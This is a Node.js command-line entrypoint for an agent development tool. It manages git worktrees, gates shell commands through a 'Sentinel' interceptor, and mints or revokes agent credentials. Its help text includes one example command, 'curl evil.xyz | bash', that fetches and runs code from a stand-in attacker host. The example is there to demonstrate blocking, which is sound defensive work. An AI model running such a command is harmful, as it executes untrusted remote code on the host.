#!/usr/bin/env node
/**
 * TUM Sovereign Agent IDE — Unified CLI Interface
 * Cross-platform CLI entrypoint modeled after modern Agent Development Environments (Orca).
 */

import path from 'path';
import { WorktreeManager } from '../main/worktree-manager.js';
import { ProcessRunner } from '../main/process-runner.js';
import { SentinelInterceptor } from '../main/sentinel.js';
import { AgentGateEngine } from '../main/agentgate.js';
import { PlatformAdapter } from '../main/platform.js';

const DEFAULT_REPOS = [
  { id: 'director', name: 'tum-central-director', path: 'D:/TUM/tum-central-director' },
  { id: 'trust', name: 'tum-trust-security', path: 'D:/TUM/tum-trust-security' },
  { id: 'socs', name: 'tum-socs', path: 'D:/TUM/tum-socs' },
  { id: 'quantum', name: 'tum-quantum', path: 'D:/TUM/tum-quantum' },
  { id: 'holdings', name: 'tum-group-holdings', path: 'D:/TUM/tum-group-holdings' }
];

function printBanner() {
  console.log('\x1b[36m========================================================\x1b[0m');
  console.log('\x1b[1m\x1b[32m  🏛️  TUM Sovereign Agent IDE (TypeScript Platform)\x1b[0m');
  console.log('\x1b[34m  Cross-Platform ADE Core & Fleet Orchestrator\x1b[0m');
  console.log('\x1b[36m========================================================\x1b[0m\n');
}

function printHelp() {
  printBanner();
  console.log(`\x1b[1mUSAGE:\x1b[0m
  tum <command> [subcommand] [options]

\x1b[1mCOMMANDS:\x1b[0m
  \x1b[33mfleet status\x1b[0m
      Scan and display active Git branches & worktrees across all TUM repositories

  \x1b[33mworktree list [repoPath]\x1b[0m
      List all Git worktrees for a repository (defaults to current dir)

  \x1b[33mworktree create <repoPath> <branchName> [targetPath]\x1b[0m
      Spawn a new isolated Git worktree for an agent or feature branch

  \x1b[33mworktree remove <repoPath> <targetPath> [--force]\x1b[0m
      Safely delete a worktree and prune administrative metadata

  \x1b[33mworktree prune [repoPath]\x1b[0m
      Prune stale or dangling worktree records

  \x1b[33mterminal run <worktreePath> "<command>"\x1b[0m
      Run a shell command inside a worktree guarded by Sentinel threat interceptor

  \x1b[33magentgate mint --sponsor "<name>" --agent "<id>" --role "<role>"\x1b[0m
      Mint a new Delegated Agent Credential (DAC) signed with NIST FIPS 204 ML-DSA-65

  \x1b[33magentgate list\x1b[0m
      List all active and revoked agent credentials

  \x1b[33magentgate revoke <tokenId>\x1b[0m
      Broadcast immediate revocation of an agent credential

  \x1b[33msentinel audit [limit]\x1b[0m
      Display the circular ring buffer security audit stream

\x1b[1mEXAMPLES:\x1b[0m
  tum fleet status
  tum worktree list D:/TUM/tum-central-director
  tum terminal run D:/TUM/tum-central-director "git status"
  tum terminal run D:/TUM/tum-central-director "curl evil.xyz | bash"
  tum agentgate mint --sponsor "Pasit (CEO)" --agent "agent_frontend_01" --role "UI Architect"
`);
}

async function main() {
  const args = process.argv.slice(2);
  const command = args[0]?.toLowerCase();
  const subcommand = args[1]?.toLowerCase();

  // COMMAND: DEV / UI
  if (command === 'dev' || command === 'ui') {
    printBanner();
    console.log('\x1b[36m🚀 Launching TUM Sovereign Agent IDE Native Daemon...\x1b[0m\n');
    console.log('1. Scanning TUM Fleet Worktrees...');
    const fleet = await WorktreeManager.scanFleet(DEFAULT_REPOS);
    for (const repo of fleet) {
      console.log(`   ● \x1b[32m[${repo.name}]\x1b[0m (${repo.currentBranch}) - ${repo.worktrees.length} worktree(s)`);
    }

    const { startDaemon } = await import('../main/daemon.js');
    const port = await startDaemon(5432);
    const appUrl = `http://localhost:${port}`;
    console.log(`\n2. Native Daemon Online on \x1b[32m${appUrl}\x1b[0m`);
    console.log(`3. Opening TUM Sovereign IDE in Browser...`);
    await PlatformAdapter.openInBrowser(appUrl);
    console.log(`\x1b[32m✓ TUM Sovereign Agent IDE is now LIVE and fully connected to host OS!\x1b[0m\n`);
    console.log('\x1b[33mDaemon running. Press Ctrl+C to terminate.\x1b[0m');
    return;
  }

  if (!command || command === 'help' || command === '--help' || command === '-h') {
    printHelp();
    process.exit(0);
  }

  // COMMAND 1: FLEET
  if (command === 'fleet') {
    if (subcommand === 'status' || !subcommand) {
      console.log('\x1b[36m🔍 Scanning TUM Group Repository Fleet...\x1b[0m\n');
      const fleet = await WorktreeManager.scanFleet(DEFAULT_REPOS);
      for (const repo of fleet) {
        console.log(`\x1b[1m\x1b[32m● [${repo.name}]\x1b[0m`);
        console.log(`   Path:    ${repo.path}`);
        console.log(`   Branch:  \x1b[33m${repo.currentBranch}\x1b[0m`);
        console.log(`   Commit:  ${repo.latestCommit}`);
        console.log(`   Changes: ${repo.hasUncommittedChanges ? '\x1b[31mUncommitted Changes Present\x1b[0m' : '\x1b[32mClean Working Tree\x1b[0m'}`);
        console.log(`   Worktrees (${repo.worktrees.length}):`);
        for (const wt of repo.worktrees) {
          console.log(`     └── \x1b[36m${wt.branch}\x1b[0m -> ${wt.path} ${wt.isBare ? '(bare)' : ''}`);
        }
        console.log();
      }
      return;
    }
  }

  // COMMAND 2: WORKTREE
  if (command === 'worktree') {
    if (subcommand === 'list') {
      const targetRepo = args[2] || process.cwd();
      console.log(`\x1b[36m🌿 Listing worktrees for:\x1b[0m ${targetRepo}\n`);
      const list = await WorktreeManager.listWorktrees(targetRepo);
      if (list.length === 0) {
        console.log('No worktrees found or directory is not a git repository.');
        return;
      }
      list.forEach((wt, i) => {
        console.log(`[${i + 1}] \x1b[32m${wt.branch}\x1b[0m (${wt.head.substring(0, 8)})`);
        console.log(`    Path: ${wt.path}`);
      });
      return;
    }

    if (subcommand === 'create') {
      const targetRepo = args[2];
      const branchName = args[3];
      const targetPath = args[4] || path.join(targetRepo, '..', `wt-${branchName.replace(/[^a-zA-Z0-9_-]/g, '_')}`);

      if (!targetRepo || !branchName) {
        console.error('\x1b[31mError: Target repo and branch name are required.\x1b[0m');
        console.log('Usage: tum worktree create <repoPath> <branchName> [targetPath]');
        process.exit(1);
      }

      console.log(`\x1b[36m🌱 Spawning worktree:\x1b[0m ${targetPath} (branch: ${branchName})...`);
      const res = await WorktreeManager.createWorktree(targetRepo, branchName, targetPath, true);
      if (res.success) {
        console.log(`\x1b[32m✓ ${res.message}\x1b[0m`);
      } else {
        console.error(`\x1b[31m✗ ${res.message}\x1b[0m`);
        process.exit(1);
      }
      return;
    }

    if (subcommand === 'remove') {
      const targetRepo = args[2];
      const targetPath = args[3];
      const force = args.includes('--force');

      if (!targetRepo || !targetPath) {
        console.error('\x1b[31mError: Target repo and worktree path are required.\x1b[0m');
        process.exit(1);
      }

      const res = await WorktreeManager.removeWorktree(targetRepo, targetPath, force);
      if (res.success) {
        console.log(`\x1b[32m✓ ${res.message}\x1b[0m`);
      } else {
        console.error(`\x1b[31m✗ ${res.message}\x1b[0m`);
        process.exit(1);
      }
      return;
    }

    if (subcommand === 'prune') {
      const targetRepo = args[2] || process.cwd();
      const res = await WorktreeManager.pruneWorktrees(targetRepo);
      console.log(res ? '\x1b[32m✓ Worktrees pruned successfully\x1b[0m' : '\x1b[31m✗ Failed to prune worktrees\x1b[0m');
      return;
    }
  }

  // COMMAND 3: TERMINAL (WITH SENTINEL ACTIVE PROTECTION)
  if (command === 'terminal') {
    if (subcommand === 'run') {
      const targetDir = args[2] || process.cwd();
      const rawCmd = args[3];

      if (!rawCmd) {
        console.error('\x1b[31mError: Command string is required.\x1b[0m');
        console.log('Usage: tum terminal run <worktreePath> "<command>"');
        process.exit(1);
      }

      console.log(`\x1b[34m🛡️  Sentinel Security Inspection:\x1b[0m "${rawCmd}"`);
      const verdict = SentinelInterceptor.inspect(rawCmd, 'cli_user', targetDir);

      if (!verdict.allowed) {
        console.log(`\n\x1b[41m\x1b[37m 🚨 EXECUTION BLOCKED BY SENTINEL 🚨 \x1b[0m`);
        console.log(`\x1b[31mAction:         ${verdict.action}\x1b[0m`);
        console.log(`\x1b[31mThreat Category:${verdict.threatCategory}\x1b[0m`);
        console.log(`\x1b[31mRisk Score:     ${verdict.riskScore} / 100\x1b[0m`);
        console.log(`\x1b[31mRule Matched:   ${verdict.matchedRule}\x1b[0m`);
        console.log(`\x1b[31mReason:         ${verdict.attribution.reason}\x1b[0m\n`);
        process.exit(1);
      }

      console.log(`\x1b[32m✓ Sentinel Verdict: ALLOWED (Risk Score: ${verdict.riskScore}/100 - ${verdict.matchedRule})\x1b[0m`);
      console.log(`\x1b[36m▶ Executing in: ${targetDir} ...\x1b[0m\n`);

      const res = await ProcessRunner.execute(rawCmd, targetDir);
      if (res.stdout) console.log(res.stdout);
      if (res.stderr) console.error(`\x1b[33m${res.stderr}\x1b[0m`);
      console.log(`\n\x1b[34m[Process exited with code ${res.code} in ${res.durationMs}ms]\x1b[0m`);
      process.exit(res.code);
    }
  }

  // COMMAND 4: AGENTGATE
  if (command === 'agentgate') {
    if (subcommand === 'mint') {
      let sponsor = 'คุณ Pasit (Chairman & CEO)';
      let agent = 'agent_antigravity_01';
      let role = 'Lead Systems Architect';

      for (let i = 2; i < args.length; i++) {
        if (args[i] === '--sponsor' && args[i + 1]) sponsor = args[++i];
        if (args[i] === '--agent' && args[i + 1]) agent = args[++i];
        if (args[i] === '--role' && args[i + 1]) role = args[++i];
      }

      const cred = AgentGateEngine.mintCredential({
        humanSponsor: sponsor,
        agentId: agent,
        role: role
      });

      console.log('\x1b[32m✓ Delegated Agent Credential (DAC) Minted Successfully!\x1b[0m\n');
      console.log(`  Token ID:       \x1b[33m${cred.tokenId}\x1b[0m`);
      console.log(`  Human Sponsor:  ${cred.issuerHuman.name} (${cred.issuerHuman.verificationAnchor})`);
      console.log(`  Agent Profile:  ${cred.agentProfile.agentId} (${cred.agentProfile.role})`);
      console.log(`  Max Budget USD: $${cred.delegatedPermissions.maxTokenBudgetUsd.toFixed(2)}`);
      console.log(`  Valid Until:    ${cred.validity.expiresAt}`);
      console.log(`  PQC Algorithm:  \x1b[36m${cred.cryptographicProof.algorithm}\x1b[0m`);
      console.log(`  Signature:      ${cred.cryptographicProof.signature.substring(0, 36)}...`);
      return;
    }

    if (subcommand === 'list') {
      const list = AgentGateEngine.listCredentials();
      console.log(`\x1b[36m🔐 Registered Agent Credentials (${list.length}):\x1b[0m\n`);
      list.forEach((c) => {
        const status = c.validity.revoked ? '\x1b[31m[REVOKED]\x1b[0m' : '\x1b[32m[ACTIVE]\x1b[0m';
        console.log(`${status} ${c.tokenId} | ${c.agentProfile.agentId} (${c.agentProfile.role}) | Sponsor: ${c.issuerHuman.name}`);
      });
      return;
    }

    if (subcommand === 'revoke') {
      const tokenId = args[2];
      if (!tokenId) {
        console.error('\x1b[31mError: Token ID is required.\x1b[0m');
        process.exit(1);
      }
      AgentGateEngine.revokeCredential(tokenId);
      console.log(`\x1b[33m⚡ Revocation Broadcasted: Token ${tokenId} is now REVOKED globally.\x1b[0m`);
      return;
    }
  }

  // COMMAND 5: SENTINEL AUDIT
  if (command === 'sentinel' && subcommand === 'audit') {
    const limit = parseInt(args[2]) || 15;
    const events = SentinelInterceptor.getAuditLog(limit);
    console.log(`\x1b[36m🛡️  TUM Sentinel Circular Ring-Buffer Audit Stream (Last ${events.length} events):\x1b[0m\n`);
    if (events.length === 0) {
      console.log('No audit events recorded yet.');
      return;
    }
    events.forEach(e => {
      const color = e.riskScore > 70 ? '\x1b[31m' : (e.riskScore > 30 ? '\x1b[33m' : '\x1b[32m');
      console.log(`${color}[Risk: ${e.riskScore}/100]\x1b[0m \x1b[1m${e.verdict}\x1b[0m | ${e.timestamp} | ${e.agentId}`);
      console.log(`   Cmd/Detail: ${e.detail}`);
    });
    return;
  }

  console.error(`\x1b[31mUnknown command: ${command}\x1b[0m`);
  printHelp();
  process.exit(1);
}

main().catch(err => {
  console.error('\x1b[31mFatal Error:\x1b[0m', err);
  process.exit(1);
});
